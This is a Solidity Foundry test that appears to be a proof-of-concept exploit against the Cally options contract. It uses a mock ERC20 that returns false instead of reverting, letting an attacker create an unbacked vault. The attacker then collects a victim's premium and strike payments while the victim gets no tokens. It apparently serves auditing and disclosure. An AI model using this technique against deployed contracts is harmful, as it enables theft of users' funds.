// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/Cally.sol";
import "solmate/tokens/ERC20.sol";
import "solmate/tokens/ERC721.sol";

// Mock ERC20 token that returns false on transfer failure instead of reverting
contract FalseReturningERC20 is ERC20 {
    constructor() ERC20("FalseToken", "FALSE", 18) {}

    // Override transfer to return false instead of reverting when balance is insufficient
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        // Check if sender has enough balance
        if (balanceOf[from] < amount) {
            return false; // Return false instead of reverting
        }

        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;

        balanceOf[from] -= amount;
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(from, to, amount);
        return true;
    }
}

// Mock NFT for testing
contract MockNFT is ERC721 {
    uint256 private _tokenIdCounter;

    constructor() ERC721("MockNFT", "MNFT") {}

    function mint(address to) external returns (uint256) {
        _tokenIdCounter++;
        _mint(to, _tokenIdCounter);
        return _tokenIdCounter;
    }
}

contract ExploitTest is Test {
    Cally public cally;
    FalseReturningERC20 public falseToken;
    MockNFT public mockNFT;

    address public attacker;
    address public victim;

    function setUp() public {
        // Deploy contracts
        cally = new Cally();
        falseToken = new FalseReturningERC20();
        mockNFT = new MockNFT();

        // Setup accounts
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        // Fund victim with ETH to buy and exercise option
        vm.deal(victim, 100 ether);
    }

    function testExploitFalseReturningToken() public {
        // STEP 1: Attacker creates a vault with ERC20 tokens they don't have
        // The attacker doesn't have any tokens, but the vault creation will succeed
        // because the token returns false instead of reverting
        
        vm.startPrank(attacker);
        
        // Attacker has 0 balance of falseToken
        assertEq(falseToken.balanceOf(attacker), 0);
        
        // Attacker approves Cally to spend tokens (even though they have none)
        falseToken.approve(address(cally), type(uint256).max);
        
        // Attacker creates a vault with 100 tokens they don't own
        // This should fail but won't because transferFrom returns false instead of reverting
        uint256 vaultId = cally.createVault(
            100 ether, // tokenIdOrAmount - claiming to vault 100 tokens
            address(falseToken), // token address
            0, // premiumIndex (0.01 ether)
            7, // durationDays
            0, // dutchAuctionStartingStrikeIndex (1 ether)
            0.5 ether, // dutchAuctionReserveStrike
            Cally.TokenType.ERC20 // tokenType
        );
        
        vm.stopPrank();
        
        // STEP 2: Verify the vault was created even though no tokens were transferred
        assertEq(cally.ownerOf(vaultId), attacker);
        assertEq(falseToken.balanceOf(address(cally)), 0); // Cally has 0 tokens!
        assertEq(falseToken.balanceOf(attacker), 0); // Attacker still has 0 tokens
        
        // STEP 3: Victim buys the option, paying premium to attacker
        vm.startPrank(victim);
        
        uint256 premium = cally.getPremium(vaultId);
        uint256 victimBalanceBefore = victim.balance;
        
        // Victim buys the option
        uint256 optionId = cally.buyOption{value: premium}(vaultId);
        
        // Victim paid the premium
        assertEq(victim.balance, victimBalanceBefore - premium);
        assertEq(cally.ethBalance(attacker), premium); // Attacker received premium
        
        vm.stopPrank();
        
        // STEP 4: Victim exercises the option, paying strike price
        vm.warp(block.timestamp + 1 hours); // Move forward in time
        
        vm.startPrank(victim);
        
        Cally.Vault memory vault = cally.vaults(vaultId);
        uint256 strike = vault.currentStrike;
        
        uint256 victimBalanceBeforeExercise = victim.balance;
        
        // Victim exercises the option, paying the strike
        cally.exercise{value: strike}(optionId);
        
        vm.stopPrank();
        
        // STEP 5: Verify the exploit - victim paid but received nothing
        // Victim paid strike price
        assertEq(victim.balance, victimBalanceBeforeExercise - strike);
        
        // Attacker received the strike payment
        assertEq(cally.ethBalance(attacker), premium + strike);
        
        // Victim received 0 tokens (because Cally never had them)
        assertEq(falseToken.balanceOf(victim), 0);
        
        // STEP 6: Attacker harvests all the ETH
        vm.prank(attacker);
        uint256 attackerBalanceBefore = attacker.balance;
        cally.harvest();
        
        // Attacker successfully stole victim's ETH without providing any collateral
        assertEq(attacker.balance, attackerBalanceBefore + premium + strike);
        
        // Final verification: The exploit succeeded
        // - Attacker never had any tokens
        // - Victim paid premium + strike
        // - Victim received nothing
        // - Attacker received all the ETH
        console.log("Exploit successful!");
        console.log("Attacker profit:", attacker.balance);
        console.log("Victim loss:", premium + strike);
        console.log("Tokens victim received:", falseToken.balanceOf(victim));
    }
}